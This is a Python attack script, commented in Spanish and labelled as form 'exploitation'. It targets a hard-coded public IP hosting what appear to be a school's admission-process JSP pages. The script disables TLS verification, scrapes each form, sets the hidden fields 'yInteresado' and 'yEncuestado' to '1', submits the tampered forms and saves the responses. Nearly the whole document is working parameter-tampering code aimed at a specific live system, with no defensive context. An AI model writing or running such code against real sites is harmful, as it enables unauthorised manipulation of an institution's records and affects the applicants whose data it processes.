import requests
import urllib3
from bs4 import BeautifulSoup
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FormExploiterFixed:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def safe_filename(self, filename):
        """Crea nombres de archivo seguros"""
        keepchars = ('-', '_', '.')
        return "".join(c for c in filename if c.isalnum() or c in keepchars).rstrip()

    def exploit_interesado_forms_fixed(self):
        """Explota formularios con manejo seguro de archivos"""
        print("[*] Explotando formularios (versión corregida)...")
        
        urls = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D", 
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp"
        ]
        
        for url in urls:
            try:
                full_url = f"{self.base_url}{url}"
                print(f"\n[*] Analizando: {url}")
                
                response = self.session.get(full_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form')
                
                if form:
                    # Extraer action del formulario
                    action = form.get('action', '')
                    if not action:
                        action = url.split('?')[0]  # Usar la URL base sin parámetros
                    
                    # Construir URL de destino
                    if action.startswith('/'):
                        target_url = f"{self.base_url}{action}"
                    elif action.startswith('http'):
                        target_url = action
                    else:
                        target_url = f"{self.base_url}/jsp/escolar/proceso_admision/{action}"
                    
                    # Preparar datos del formulario
                    form_data = {}
                    inputs = form.find_all('input')
                    
                    for inp in inputs:
                        name = inp.get('name')
                        value = inp.get('value', '')
                        if name:
                            form_data[name] = value
                    
                    # Manipular datos importantes
                    if 'yInteresado' in form_data:
                        form_data['yInteresado'] = '1'
                    if 'yEncuestado' in form_data:
                        form_data['yEncuestado'] = '1'
                    
                    # Enviar formulario
                    print(f"    [+] Enviando a: {target_url}")
                    response = self.session.post(target_url, data=form_data, timeout=10)
                    
                    print(f"    Status: {response.status_code}")
                    
                    # Guardar respuesta con nombre seguro
                    safe_name = self.safe_filename(url.replace('/', '_'))
                    filename = f"form_response_{safe_name}.html"
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"    [+] Respuesta guardada en {filename}")
                    
            except Exception as e:
                print(f"    [-] Error: {e}")

# Ejecutar formularios corregidos
print("=== EXPLOTACIÓN DE FORMULARIOS CORREGIDA ===")
form_exploiter = FormExploiterFixed("189.254.143.102")
form_exploiter.exploit_interesado_forms_fixed()